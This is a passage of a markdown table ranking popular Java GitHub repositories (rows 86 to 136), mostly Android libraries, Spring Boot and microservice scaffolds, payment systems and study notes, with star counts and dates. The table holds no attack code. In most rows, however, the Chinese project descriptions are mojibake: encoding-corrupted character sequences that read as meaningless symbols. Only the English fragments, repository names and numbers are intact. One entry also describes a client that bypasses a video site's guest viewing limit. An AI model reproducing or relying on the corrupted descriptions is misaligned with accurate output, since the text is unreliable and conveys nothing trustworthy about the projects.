...|4.9k|Java|10/20|
|86|[ximsfei/Android-skin-support](https://github.com/ximsfei/Android-skin-support)|Android-skin-support is an easy dynamic skin framework to use  for Android, Only one line of code to integrate it. Android Êç¢ËÇ§Ê°ÜÊû∂, ÊûÅ‰ΩéÁöÑÂ≠¶‰π†ÊàêÊú¨, ÊûÅÂ•ΩÁöÑÁî®Êà∑‰ΩìÈ™å. ""‰∏ÄË°å""‰ª£Á†ÅÂ∞±ÂèØ‰ª•ÂÆûÁé∞Êç¢ËÇ§, ‰Ω†ÂÄºÂæóÊã•Êúâ!!!|4.9k|Java|09/03|
|87|[wuhaoyu1990/MagicCamera](https://github.com/wuhaoyu1990/MagicCamera)|Real-time Filter Camera&VideoRecorder And ImageEditor With Face Beauty For Android---ÂåÖÂê´ÁæéÈ¢úÁ≠â40‰ΩôÁßçÂÆûÊó∂Êª§ÈïúÁõ∏Êú∫ÔºåÂèØÊãçÁÖß„ÄÅÂΩïÂÉè„ÄÅÂõæÁâá‰øÆÊîπ|4.9k|Java|10/22|
|88|[yanzhenjie/SwipeRecyclerView](https://github.com/yanzhenjie/SwipeRecyclerView)|:melon: RecyclerView‰æßÊªëËèúÂçïÔºåItemÊãñÊãΩÔºåÊªëÂä®Âà†Èô§ItemÔºåËá™Âä®Âä†ËΩΩÊõ¥Â§öÔºåHeaderViewÔºåFooterViewÔºåItemÂàÜÁªÑÈªèË¥¥„ÄÇ|4.9k|Java|05/31|
|89|[changmingxie/tcc-transaction](https://github.com/changmingxie/tcc-transaction)|tcc-transactionÊòØTCCÂûã‰∫ãÂä°javaÂÆûÁé∞|4.8k|Java|10/13|
|90|[Tencent/Shadow](https://github.com/Tencent/Shadow)|Èõ∂ÂèçÂ∞ÑÂÖ®Âä®ÊÄÅAndroidÊèí‰ª∂Ê°ÜÊû∂|4.8k|Java|10/29|
|91|[TommyLemon/Android-ZBLibrary](https://github.com/TommyLemon/Android-ZBLibrary)|üî•Android MVP Âø´ÈÄüÂºÄÂèëÊ°ÜÊû∂ÔºåÂÅöÂõΩÂÜÖ „ÄåÁ§∫‰æãÊúÄÂÖ®Èù¢„Äç„ÄåÊ≥®ÈáäÊúÄËØ¶ÁªÜ„Äç„Äå‰ΩøÁî®ÊúÄÁÆÄÂçï„Äç„Äå‰ª£Á†ÅÊúÄ‰∏•Ë∞®„ÄçÁöÑ Android ÂºÄÊ∫ê UI Ê°ÜÊû∂„ÄÇ                üî•An Android MVP Framework with many demos, detailed documents, simple usages and strict codes.|4.7k|Java|09/13|
|92|[apache/incubator-dolphinscheduler](https://github.com/apache/incubator-dolphinscheduler)|Dolphin Scheduler is a distributed and easy-to-extend visual workflow scheduling platform, dedicated to solving the complex dependencies in data processing, making the scheduling system out of the box for data processing.(ÂàÜÂ∏ÉÂºèÊòìÊâ©Â±ïÁöÑÂèØËßÜÂåñÂ∑•‰ΩúÊµÅ‰ªªÂä°Ë∞ÉÂ∫¶)|4.6k|Java|10/30|
|93|[hongyangAndroid/baseAdapter](https://github.com/hongyangAndroid/baseAdapter)|Android ‰∏áËÉΩÁöÑAdapter for ListView,RecyclerView,GridViewÁ≠âÔºåÊîØÊåÅÂ§öÁßçItemÁ±ªÂûãÁöÑÊÉÖÂÜµ„ÄÇ|4.6k|Java|02/13|
|94|[wxiaoqi/Spring-Cloud-Platform](https://github.com/wxiaoqi/Spring-Cloud-Platform)|Cloud-PlatformÊòØÂõΩÂÜÖÈ¶ñ‰∏™Âü∫‰∫éSpring CloudÁöÑÂæÆÊúçÂä°ÂºÄÂèëÂπ≥Âè∞ÔºåÂÖ∑ÊúâÁªü‰∏ÄÊéàÊùÉ„ÄÅËÆ§ËØÅÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÖ∂‰∏≠ÂåÖÂê´ÂÖ∑Â§áÁî®Êà∑ÁÆ°ÁêÜ„ÄÅËµÑÊ∫êÊùÉÈôêÁÆ°ÁêÜ„ÄÅÁΩëÂÖ≥APIÁÆ°ÁêÜÁ≠âÂ§ö‰∏™Ê®°ÂùóÔºåÊîØÊåÅÂ§ö‰∏öÂä°Á≥ªÁªüÂπ∂Ë°åÂºÄÂèëÔºåÂèØ‰ª•‰Ωú‰∏∫ÂêéÁ´ØÊúçÂä°ÁöÑÂºÄÂèëËÑöÊâãÊû∂„ÄÇ‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÊû∂ÊûÑÊ∏ÖÊô∞ÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÁõ¥Êé•È°πÁõÆ‰∏≠‰ΩøÁî®„ÄÇÊ†∏ÂøÉÊäÄÊúØÈááÁî®Spring Boot2‰ª•ÂèäSpring Cloud GatewayÁõ∏ÂÖ≥Ê†∏ÂøÉÁªÑ‰ª∂ÔºåÂâçÁ´ØÈááÁî®vue-element-adminÁªÑ‰ª∂„ÄÇ|4.5k|Java|10/20|
|95|[SplashCodes/JAViewer](https://github.com/SplashCodes/JAViewer)|Êõ¥‰ºòÈõÖÁöÑÈ©æËΩ¶‰ΩìÈ™å|4.5k|Java|08/29|
|96|[yuanguangxin/LeetCode](https://github.com/yuanguangxin/LeetCode)|LeetCodeÂà∑È¢òËÆ∞ÂΩï‰∏éÈù¢ËØïÊï¥ÁêÜ|4.5k|Java|10/13|
|97|[527515025/springBoot](https://github.com/527515025/springBoot)|springboot Ê°ÜÊû∂‰∏éÂÖ∂ÂÆÉÁªÑ‰ª∂ÁªìÂêàÂ¶Ç jpa„ÄÅmybatis„ÄÅwebsocket„ÄÅsecurity„ÄÅshiro„ÄÅcacheÁ≠â|4.4k|Java|10/18|
|98|[zhanghai/Douya](https://github.com/zhanghai/Douya)|ÂºÄÊ∫êÁöÑ Material Design Ë±ÜÁì£ÂÆ¢Êà∑Á´ØÔºàA Material Design app for douban.comÔºâ|4.4k|Java|04/13|
|99|[youlookwhat/CloudReader](https://github.com/youlookwhat/CloudReader)|‰∫ëÈòÖÔºö‰∏ÄÊ¨æÂü∫‰∫éÁΩëÊòì‰∫ëÈü≥‰πêUIÔºå‰ΩøÁî®WanAndroid„ÄÅGank.IoÂèäÊó∂ÂÖâÁΩëapiÂºÄÂèëÁöÑÁ¨¶ÂêàGoogle Material DesignÁöÑAndroidÂÆ¢Êà∑Á´Ø„ÄÇÈ°πÁõÆÈááÂèñÁöÑÊòØMVVM-DataBindingÊû∂ÊûÑÂºÄÂèëÔºå‰∏ªË¶ÅÂåÖÊã¨ÔºöÁé©ÂÆâÂçìÂå∫„ÄÅÂπ≤Ë¥ßÂå∫ÂíåÁîµÂΩ±Âå∫‰∏â‰∏™Â≠êÊ®°Âùó„ÄÇ|4.4k|Java|10/29|
|100|[ZXZxin/ZXBlog](https://github.com/ZXZxin/ZXBlog)|ËÆ∞ÂΩïÂêÑÁßçÂ≠¶‰π†Á¨îËÆ∞(ÁÆóÊ≥ï„ÄÅJava„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÂπ∂Âèë......)|4.4k|Java|03/26|
|101|[ffay/lanproxy](https://github.com/ffay/lanproxy)|lanproxyÊòØ‰∏Ä‰∏™Â∞ÜÂ±ÄÂüüÁΩë‰∏™‰∫∫ÁîµËÑë„ÄÅÊúçÂä°Âô®‰ª£ÁêÜÂà∞ÂÖ¨ÁΩëÁöÑÂÜÖÁΩëÁ©øÈÄèÂ∑•ÂÖ∑ÔºåÊîØÊåÅtcpÊµÅÈáèËΩ¨ÂèëÔºåÂèØÊîØÊåÅ‰ªª‰Ωïtcp‰∏äÂ±ÇÂçèËÆÆÔºàËÆøÈóÆÂÜÖÁΩëÁΩëÁ´ô„ÄÅÊú¨Âú∞ÊîØ‰ªòÊé•Âè£Ë∞ÉËØï„ÄÅsshËÆøÈóÆ„ÄÅËøúÁ®ãÊ°åÈù¢...Ôºâ„ÄÇÁõÆÂâçÂ∏ÇÈù¢‰∏äÊèê‰æõÁ±ª‰ººÊúçÂä°ÁöÑÊúâËä±ÁîüÂ£≥„ÄÅTeamView„ÄÅGoToMyCloudÁ≠âÁ≠âÔºå‰ΩÜË¶Å‰ΩøÁî®Á¨¨‰∏âÊñπÁöÑÂÖ¨ÁΩëÊúçÂä°Âô®Â∞±ÂøÖÈ°ª‰∏∫Á¨¨‰∏âÊñπ‰ªòË¥πÔºåÂπ∂‰∏îËøô‰∫õÊúçÂä°ÈÉΩÊúâÂêÑÁßçÂêÑÊ†∑ÁöÑÈôêÂà∂ÔºåÊ≠§Â§ñÔºåÁî±‰∫éÊï∞ÊçÆÂåÖ‰ºöÊµÅÁªèÁ¨¨‰∏âÊñπÔºåÂõ†Ê≠§ÂØπÊï∞ÊçÆÂÆâÂÖ®‰πüÊòØ‰∏ÄÂ§ßÈöêÊÇ£„ÄÇÊäÄÊúØ‰∫§ÊµÅQQÁæ§ 1067424330|4.2k|Java|10/13|
|102|[h2pl/Java-Tutorial](https://github.com/h2pl/Java-Tutorial)|„ÄêJavaÂ∑•Á®ãÂ∏àÈù¢ËØïÂ§ç‰π†ÊåáÂçó„ÄëÊú¨‰ªìÂ∫ìÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜÔºåÊï¥Âêà‰∫Ü‰∫íËÅîÁΩë‰∏äÁöÑÂæàÂ§ö‰ºòË¥®JavaÊäÄÊúØÊñáÁ´†ÔºåÂäõÊ±ÇÊâìÈÄ†‰∏∫ÊúÄÂÆåÊï¥ÊúÄÂÆûÁî®ÁöÑJavaÂºÄÂèëËÄÖÂ≠¶‰π†ÊåáÂçóÔºåÂ¶ÇÊûúÂØπ‰Ω†ÊúâÂ∏ÆÂä©ÔºåÁªô‰∏™starÂëäËØâÊàëÂêßÔºåË∞¢Ë∞¢ÔºÅ|4.1k|Java|10/01|
|103|[jeasonlzy/ImagePicker](https://github.com/jeasonlzy/ImagePicker)|ÂÆåÂÖ®‰ªøÂæÆ‰ø°ÁöÑÂõæÁâáÈÄâÊã©ÔºåÂπ∂‰∏îÊèê‰æõ‰∫ÜÂ§öÁßçÂõæÁâáÂä†ËΩΩÊé•Âè£ÔºåÈÄâÊã©ÂõæÁâáÂêéÂèØ‰ª•ÊóãËΩ¨ÔºåÂèØ‰ª•Ë£ÅÂâ™ÊàêÁü©ÂΩ¢ÊàñÂúÜÂΩ¢ÔºåÂèØ‰ª•ÈÖçÁΩÆÂêÑÁßçÂÖ∂‰ªñÁöÑÂèÇÊï∞|4.1k|Java|10/27|
|104|[razerdp/BasePopup](https://github.com/razerdp/BasePopup)|‰∏ÄÊ¨æÈíàÂØπÁ≥ªÁªüPopupWindow‰ºòÂåñÁöÑPopupÂ∫ìÔºåÂäüËÉΩÂº∫Â§ßÔºåÊîØÊåÅËÉåÊôØÊ®°Á≥äÔºå‰ΩøÁî®ÁÆÄÂçïÔºå‰Ω†‰ºöÁà±‰∏ä‰ªñÁöÑ~|4.0k|Java|10/17|
|105|[techGay/v9porn](https://github.com/techGay/v9porn)|9*Porn Android ÂÆ¢Êà∑Á´ØÔºåÁ™ÅÁ†¥Ê∏∏ÂÆ¢ÊØèÂ§©ËßÇÁúã10Ê¨°ËßÜÈ¢ëÁöÑÈôêÂà∂ÔºåËøòÂèØ‰ª•‰∏ãËΩΩËßÜÈ¢ë|4.0k|Java|10/09|
|106|[AriaLyy/Aria](https://github.com/AriaLyy/Aria)|‰∏ãËΩΩÂèØ‰ª•ÂæàÁÆÄÂçï|4.0k|Java|10/17|
|107|[Jacksgong/JKeyboardPanelSwitch](https://github.com/Jacksgong/JKeyboardPanelSwitch)|For resolve the layout conflict when keybord & panel are switching (AndroidÈîÆÁõòÈù¢ÊùøÂÜ≤Á™Å Â∏ÉÂ±ÄÈó™Âä®Â§ÑÁêÜÊñπÊ°à)|4.0k|Java|08/18|
|108|[hustcc/JS-Sorting-Algorithm](https://github.com/hustcc/JS-Sorting-Algorithm)|‰∏ÄÊú¨ÂÖ≥‰∫éÊéíÂ∫èÁÆóÊ≥ïÁöÑ GitBook Âú®Á∫ø‰π¶Á±ç „ÄäÂçÅÂ§ßÁªèÂÖ∏ÊéíÂ∫èÁÆóÊ≥ï„ÄãÔºåÂ§öËØ≠Ë®ÄÂÆûÁé∞„ÄÇ|3.9k|Java|10/22|
|109|[YunaiV/onemall](https://github.com/YunaiV/onemall)|ËäãÈÅì mall ÂïÜÂüéÔºåÂü∫‰∫éÂæÆÊúçÂä°ÁöÑÊÄùÊÉ≥ÔºåÊûÑÂª∫Âú® B2C ÁîµÂïÜÂú∫ÊôØ‰∏ãÁöÑÈ°πÁõÆÂÆûÊàò„ÄÇÊ†∏ÂøÉÊäÄÊúØÊ†àÔºåÊòØ Spring Boot + Dubbo „ÄÇÊú™Êù•Ôºå‰ºöÈáçÊûÑÊàê Spring Cloud Alibaba „ÄÇ|3.8k|Java|10/13|
|110|[roncoo/roncoo-pay](https://github.com/roncoo/roncoo-pay)|ÈæôÊûúÊîØ‰ªòÁ≥ªÁªüÔºàroncoo-payÔºâÊòØÂõΩÂÜÖÈ¶ñÊ¨æÂºÄÊ∫êÁöÑ‰∫íËÅîÁΩëÊîØ‰ªòÁ≥ªÁªüÔºåÊã•ÊúâÁã¨Á´ãÁöÑË¥¶Êà∑‰ΩìÁ≥ª„ÄÅÁî®Êà∑‰ΩìÁ≥ª„ÄÅÊîØ‰ªòÊé•ÂÖ•‰ΩìÁ≥ª„ÄÅÊîØ‰ªò‰∫§Êòì‰ΩìÁ≥ª„ÄÅÂØπË¥¶Ê∏ÖÁªìÁÆó‰ΩìÁ≥ª„ÄÇÁõÆÊ†áÊòØÊâìÈÄ†‰∏ÄÊ¨æÈõÜÊàê‰∏ªÊµÅÊîØ‰ªòÊñπÂºè‰∏îËΩªÈáèÊòìÁî®ÁöÑÊîØ‰ªòÊî∂Ê¨æÁ≥ªÁªüÔºåÊª°Ë∂≥‰∫íËÅîÁΩë‰∏öÂä°Á≥ªÁªüÊâìÈÄöÊîØ‰ªòÈÄöÈÅìÂÆûÁé∞ÊîØ‰ªòÊî∂Ê¨æÂíå‰∏öÂä°ËµÑÈáëÁÆ°ÁêÜÁ≠âÂäüËÉΩ„ÄÇ|3.7k|Java|05/21|
|111|[2227324689/gpmall](https://github.com/2227324689/gpmall)|„ÄêÂíïÊ≥°Â≠¶Èô¢ÂÆûÊàòÈ°πÁõÆ„Äë-Âü∫‰∫éSpringBoot+DubboÊûÑÂª∫ÁöÑÁîµÂïÜÂπ≥Âè∞-ÂæÆÊúçÂä°Êû∂ÊûÑ„ÄÅÂïÜÂüé„ÄÅÁîµÂïÜ„ÄÅÂæÆÊúçÂä°„ÄÅÈ´òÂπ∂Âèë„ÄÅkafka„ÄÅElasticsearch|3.7k|Java|09/10|
|112|[alipay/SoloPi](https://github.com/alipay/SoloPi)|SoloPi Ëá™Âä®ÂåñÊµãËØïÂ∑•ÂÖ∑|3.7k|Java|09/28|
|113|[Exrick/xpay](https://github.com/Exrick/xpay)|XPay‰∏™‰∫∫ÂÖçÁ≠æÊî∂Ê¨æÊîØ‰ªòÁ≥ªÁªü ÂÆåÂÖ®ÂÖçË¥π ËµÑÈáëÁõ¥Êé•Âà∞ËææÊú¨‰∫∫Ë¥¶Âè∑ ÊîØÊåÅ ÊîØ‰ªòÂÆù ÂæÆ‰ø° QQ ‰∫ëÈó™‰ªò Êó†ÈúÄÂ§áÊ°à Êó†ÈúÄÁ≠æÁ∫¶ Êó†ÈúÄÊåÇÊú∫ÁõëÊéßAPP Êó†ÈúÄÊèí‰ª∂ Êó†ÈúÄÁ¨¨‰∏âÊñπÊîØ‰ªòSDK Êó†ÈúÄËê•‰∏öÊâßÁÖßË∫´‰ªΩËØÅ Âè™ÈúÄÊî∂Ê¨æÁ†Å ÊêûÂÆöÊîØ‰ªòÊµÅÁ®ã Áé∞Â∑≤ÊîØÊåÅÁßªÂä®Á´ØÊîØ‰ªò |3.6k|Java|07/02|
|114|[javagrowing/JGrowing](https://github.com/javagrowing/JGrowing)|Java is Growing up but not only Java„ÄÇJavaÊàêÈïøË∑ØÁ∫øÔºå‰ΩÜÂ≠¶Âà∞‰∏ç‰ªÖ‰ªÖÊòØJava„ÄÇ|3.6k|Java|10/13|
|115|[zhanglei-workspace/shopping-management-system](https://github.com/zhanglei-workspace/shopping-management-system)|ËØ•È°πÁõÆ‰∏∫Â§ö‰∏™Â∞èÈ°πÁõÆÁöÑÈõÜÂêàÔºàÊåÅÁª≠Êõ¥Êñ∞‰∏≠...Ôºâ„ÄÇÂÜÖÂÆπÁ±ª‰ººÊ∑òÂÆù„ÄÅ‰∫¨‰∏úÁ≠âÁΩëË¥≠ÁÆ°ÁêÜÁ≥ªÁªü‰ª•ÂèäÂõæ‰π¶ÁÆ°ÁêÜ„ÄÅË∂ÖÂ∏ÇÁÆ°ÁêÜÁ≠âÁ≥ªÁªü„ÄÇÁõÆÁöÑÂú®‰∫é‰æø‰∫éJavaÂàùÁ∫ßÁà±Â•ΩËÄÖÂú®Â≠¶‰π†ÂÆåÊüê‰∏ÄÈÉ®ÂàÜJavaÁü•ËØÜÂêéÊúâ‰∏Ä‰∏™ÂêàÈÄÇÁöÑÈ°πÁõÆÈîªÁÇº„ÄÅËøêÁî®ÊâÄÂ≠¶Áü•ËØÜÔºåÂÆåÂñÑÁü•ËØÜ‰ΩìÁ≥ª„ÄÇÈÄÇÁî®‰∫∫Áæ§ÔºöJavaÂü∫Á°ÄÂà∞ÂÖ•Èó®ÁöÑÁà±Â•ΩËÄÖ„ÄÇ|3.6k|Java|10/15|
|116|[chillzhuang/SpringBlade](https://github.com/chillzhuang/SpringBlade)|SpringBlade ÊòØ‰∏Ä‰∏™Áî±ÂïÜ‰∏öÁ∫ßÈ°πÁõÆÂçáÁ∫ß‰ºòÂåñËÄåÊù•ÁöÑSpringCloudÂàÜÂ∏ÉÂºèÂæÆÊúçÂä°Êû∂ÊûÑ„ÄÅSpringBootÂçï‰ΩìÂºèÂæÆÊúçÂä°Êû∂ÊûÑÂπ∂Â≠òÁöÑÁªºÂêàÂûãÈ°πÁõÆÔºåÈááÁî®Java8 APIÈáçÊûÑ‰∫Ü‰∏öÂä°‰ª£Á†ÅÔºåÂÆåÂÖ®ÈÅµÂæ™ÈòøÈáåÂ∑¥Â∑¥ÁºñÁ†ÅËßÑËåÉ„ÄÇÈááÁî®Spring Boot 2 „ÄÅSpring Cloud Hoxton „ÄÅMybatis Á≠âÊ†∏ÂøÉÊäÄÊúØÔºåÂêåÊó∂Êèê‰æõÂü∫‰∫éReactÂíåVueÁöÑ‰∏§‰∏™ÂâçÁ´ØÊ°ÜÊû∂Áî®‰∫éÂø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÁ∫ßÁöÑSaaSÂ§öÁßüÊà∑ÂæÆÊúçÂä°Âπ≥Âè∞„ÄÇ  ÂÆòÁΩëÔºöhttps://bladex.vip|3.6k|Java|09/14|
|117|[kekingcn/kkFileView](https://github.com/kekingcn/kkFileView)|‰ΩøÁî®spring bootÊâìÈÄ†Êñá‰ª∂ÊñáÊ°£Âú®Á∫øÈ¢ÑËßàÈ°πÁõÆËß£ÂÜ≥ÊñπÊ°àÔºåÊîØÊåÅdoc„ÄÅdocx„ÄÅppt„ÄÅpptx„ÄÅxls„ÄÅxlsx„ÄÅzip„ÄÅrar„ÄÅmp4Ôºåmp3‰ª•Âèä‰ºóÂ§öÁ±ªÊñáÊú¨Â¶Çtxt„ÄÅhtml„ÄÅxml„ÄÅjava„ÄÅproperties„ÄÅsql„ÄÅjs„ÄÅmd„ÄÅjson„ÄÅconf„ÄÅini„ÄÅvue„ÄÅphp„ÄÅpy„ÄÅbat„ÄÅgitignoreÁ≠âÊñá‰ª∂Âú®Á∫øÈ¢ÑËßà|3.6k|Java|10/15|
|118|[luckybilly/CC](https://github.com/luckybilly/CC)|‰∏öÁïåÈ¶ñ‰∏™ÊîØÊåÅÊ∏êËøõÂºèÁªÑ‰ª∂ÂåñÊîπÈÄ†ÁöÑAndroidÁªÑ‰ª∂ÂåñÂºÄÊ∫êÊ°ÜÊû∂ÔºåÊîØÊåÅË∑®ËøõÁ®ãË∞ÉÁî®„ÄÇComponentize your android project gradually.|3.6k|Java|05/27|
|119|[oldmanpushcart/greys-anatomy](https://github.com/oldmanpushcart/greys-anatomy)|JavaËØäÊñ≠Â∑•ÂÖ∑|3.5k|Java|10/13|
|120|[zzhoujay/RichText](https://github.com/zzhoujay/RichText)|AndroidÂπ≥Âè∞‰∏ãÁöÑÂØåÊñáÊú¨Ëß£ÊûêÂô®ÔºåÊîØÊåÅHtmlÂíåMarkdown|3.5k|Java|03/06|
|121|[brianway/java-learning](https://github.com/brianway/java-learning)|Êó®Âú®ÊâìÈÄ†Âú®Á∫øÊúÄ‰Ω≥ÁöÑ Java Â≠¶‰π†Á¨îËÆ∞ÔºåÂê´ÂçöÂÆ¢ËÆ≤Ëß£ÂíåÊ∫êÁ†ÅÂÆû‰æãÔºåÂåÖÊã¨ Java SE Âíå Java Web|3.5k|Java|10/13|
|122|[Nepxion/Discovery](https://github.com/Nepxion/Discovery)|‚òÄÔ∏è Nepxion Discovery is an enhancement for Spring Cloud with gray, blue greeen, weight route, limitation, circuit breaker, degrade, failover, isolation, tracing ÁÅ∞Â∫¶ËìùÁªø„ÄÅÊùÉÈáçË∑ØÁî±„ÄÅÈôêÊµÅÁÜîÊñ≠ÈôçÁ∫ß„ÄÅÊïÖÈöúËΩ¨Áßª„ÄÅÈöîÁ¶ª„ÄÅËøΩË∏™|3.5k|Java|10/29|
|123|[hansonwang99/Spring-Boot-In-Action](https://github.com/hansonwang99/Spring-Boot-In-Action)|Spring Boot Á≥ªÂàóÂÆûÊàòÂêàÈõÜ|3.5k|Java|10/13|
|124|[pqpo/SmartCropper](https://github.com/pqpo/SmartCropper)|üî• A library for cropping image in a smart way that can identify the border and correct the cropped image.    Êô∫ËÉΩÂõæÁâáË£ÅÂâ™Ê°ÜÊû∂„ÄÇËá™Âä®ËØÜÂà´ËæπÊ°ÜÔºåÊâãÂä®Ë∞ÉËäÇÈÄâÂå∫Ôºå‰ΩøÁî®ÈÄèËßÜÂèòÊç¢Ë£ÅÂâ™Âπ∂Áü´Ê≠£ÈÄâÂå∫ÔºõÈÄÇÁî®‰∫éË∫´‰ªΩËØÅÔºåÂêçÁâáÔºåÊñáÊ°£Á≠âÁÖßÁâáÁöÑË£ÅÂâ™„ÄÇ|3.4k|Java|06/17|
|125|[ming1016/study](https://github.com/ming1016/study)|Â≠¶‰π†ËÆ∞ÂΩï|3.4k|Java|05/05|
|126|[ZHENFENG13/spring-boot-projects](https://github.com/ZHENFENG13/spring-boot-projects)|ËØ•‰ªìÂ∫ì‰∏≠‰∏ªË¶ÅÊòØ Spring Boot ÁöÑÂÖ•Èó®Â≠¶‰π†ÊïôÁ®ã‰ª•Âèä‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ Spring Boot ÂÆûÊàòÈ°πÁõÆÊïôÁ®ãÔºåÂåÖÊã¨ Spring Boot ‰ΩøÁî®ÁöÑÂêÑÁßçÁ§∫‰æã‰ª£Á†ÅÔºåÂêåÊó∂‰πüÂåÖÊã¨‰∏Ä‰∫õÂÆûÊàòÈ°πÁõÆÁöÑÈ°πÁõÆÊ∫êÁ†ÅÂíåÊïàÊûúÂ±ïÁ§∫ÔºåÂÆûÊàòÈ°πÁõÆÂåÖÊã¨Âü∫Êú¨ÁöÑ web ÂºÄÂèë‰ª•ÂèäÁõÆÂâçÂ§ßÂÆ∂ÊôÆÈÅç‰ΩøÁî®ÁöÑÁ∫ø‰∏äÂçöÂÆ¢È°πÁõÆ/‰ºÅ‰∏öÂ§ßÂûãÂïÜÂüéÁ≥ªÁªü/ÂâçÂêéÁ´ØÂàÜÁ¶ªÂÆûË∑µÈ°πÁõÆÁ≠âÔºåÊëÜËÑ±ÂêÑÁßç hello world ÂÖ•Èó®Ê°à‰æãÁöÑÊùüÁºöÔºåÁúüÊ≠£ÁöÑÊéåÊè° Spring Boot ÂºÄÂèë„ÄÇ|3.4k|Java|05/30|
|127|[mercyblitz/tech-weekly](https://github.com/mercyblitz/tech-weekly)|„ÄåÂ∞èÈ©¨Âì•ÊäÄÊúØÂë®Êä•„Äç|3.4k|Java|03/29|
|128|[guolindev/giffun](https://github.com/guolindev/giffun)|‰∏ÄÊ¨æÂºÄÊ∫êÁöÑGIFÂú®Á∫øÂàÜ‰∫´AppÔºå‰πêË∂£Â∞±Ë¶ÅÂíå‰∏ñÁïåÂàÜ‰∫´„ÄÇ|3.3k|Java|02/06|
|129|[JZ-Darkal/AndroidHttpCapture](https://github.com/JZ-Darkal/AndroidHttpCapture)|AndroidHttpCaptureÁΩëÁªúËØäÊñ≠Â∑•ÂÖ∑ ÊòØ‰∏ÄÊ¨æAndroidÊâãÊú∫ÊäìÂåÖËΩØ‰ª∂ ‰∏ªË¶ÅÂäüËÉΩÂåÖÊã¨ÔºöÊâãÊú∫Á´ØÊäìÂåÖ„ÄÅPING/DNS/TraceRouteËØäÊñ≠„ÄÅÊäìÂåÖHARÊï∞ÊçÆ‰∏ä‰º†ÂàÜ‰∫´„ÄÇ‰Ω†‰πüÂèØ‰ª•ÁúãÊàêÊòØAndroidÁâàÁöÑ""Fiddler"" \(^o^)/~|3.3k|Java|10/19|
|130|[bjmashibing/InternetArchitect](https://github.com/bjmashibing/InternetArchitect)|Âπ¥Ëñ™Áôæ‰∏á‰∫íËÅîÁΩëÊû∂ÊûÑÂ∏àËØæÁ®ãÊñáÊ°£ÂèäÊ∫êÁ†Å(ÂÖ¨ÂºÄÈÉ®ÂàÜ)|3.2k|Java|10/09|
|131|[hope-for/hope-boot](https://github.com/hope-for/hope-boot)|üå± Hope-Boot ‰∏ÄÊ¨æÁé∞‰ª£ÂåñÁöÑËÑöÊâãÊû∂È°πÁõÆ|3.2k|Java|09/10|
|132|[zuihou/zuihou-admin-cloud](https://github.com/zuihou/zuihou-admin-cloud)|Âü∫‰∫éSpringCloud(Hoxton.SR7) + SpringBoot(2.2.9.RELEASE) ÁöÑÂæÆÊúçÂä°ËÑöÊâãÊû∂ÔºåÂÖ∑ÊúâÁªü‰∏ÄÊéàÊùÉ„ÄÅËÆ§ËØÅÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÖ∂‰∏≠ÂåÖÂê´ÂÖ∑Â§áÁî®Êà∑ÁÆ°ÁêÜ„ÄÅËµÑÊ∫êÊùÉÈôêÁÆ°ÁêÜ„ÄÅÁΩëÂÖ≥API„ÄÅÂàÜÂ∏ÉÂºè‰∫ãÂä°„ÄÅÂ§ßÊñá‰ª∂Êñ≠ÁÇπÂàÜÁâáÁª≠‰º†Á≠âÂ§ö‰∏™Ê®°ÂùóÔºåÊîØÊåÅÂ§ö‰∏öÂä°Á≥ªÁªüÂπ∂Ë°åÂºÄÂèëÔºåÂèØ‰ª•‰Ωú‰∏∫ÂêéÁ´ØÊúçÂä°ÁöÑÂºÄÂèëËÑöÊâãÊû∂„ÄÇ‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÊû∂ÊûÑÊ∏ÖÊô∞ÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÁõ¥Êé•È°πÁõÆ‰∏≠‰ΩøÁî®„ÄÇÊ†∏ÂøÉÊäÄÊúØÈááÁî®Nacos„ÄÅFegin„ÄÅRibbon„ÄÅZuul„ÄÅHystrix„ÄÅJWT Token„ÄÅMybatis„ÄÅSpringBoot„ÄÅRedis„ÄÅRibbitMQÁ≠â‰∏ªË¶ÅÊ°ÜÊû∂Âíå‰∏≠Èó¥‰ª∂„ÄÇ|3.2k|Java|10/26|
|133|[mpusher/mpush](https://github.com/mpusher/mpush)|MPushÂºÄÊ∫êÂÆûÊó∂Ê∂àÊÅØÊé®ÈÄÅÁ≥ªÁªü|3.2k|Java|06/16|
|134|[luojilab/DDComponentForAndroid](https://github.com/luojilab/DDComponentForAndroid)|‰∏ÄÂ•óÂÆåÊï¥ÊúâÊïàÁöÑandroidÁªÑ‰ª∂ÂåñÊñπÊ°àÔºåÊîØÊåÅÁªÑ‰ª∂ÁöÑÁªÑ‰ª∂ÂÆåÂÖ®ÈöîÁ¶ª„ÄÅÂçïÁã¨Ë∞ÉËØï„ÄÅÈõÜÊàêË∞ÉËØï„ÄÅÁªÑ‰ª∂‰∫§‰∫í„ÄÅUIË∑≥ËΩ¨„ÄÅÂä®ÊÄÅÂä†ËΩΩÂç∏ËΩΩÁ≠âÂäüËÉΩ|3.2k|Java|08/05|
|135|[dromara/hmily](https://github.com/dromara/hmily)|ÈáëËûçÁ∫ßÊüîÊÄßÂàÜÂ∏ÉÂºè‰∫ãÂä°Ëß£ÂÜ≥ÊñπÊ°à|3.1k|Java|10/29|
|136|[getActivity/AndroidProject](https://github.com/getActivity/AndroidProject)|Android Êû∂ÊûÑÈ°πÁõÆÔºåÂè™‰∏∫ÂÜôÂ•ΩÊØè‰∏ÄÂè•‰ª£Á†Å|3.1k|Java|07/17|
